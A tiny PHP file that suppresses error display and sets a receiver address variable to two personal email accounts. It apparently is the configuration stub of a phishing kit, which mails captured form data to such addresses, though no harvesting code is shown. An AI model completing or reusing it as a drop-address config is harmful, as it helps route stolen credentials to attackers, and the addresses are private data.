<?php
ini_set('display_errors', 0);
$receiverAddress = "Sharenwillsons0@yahoo.com,sillyhead206@protonmail.com";


?>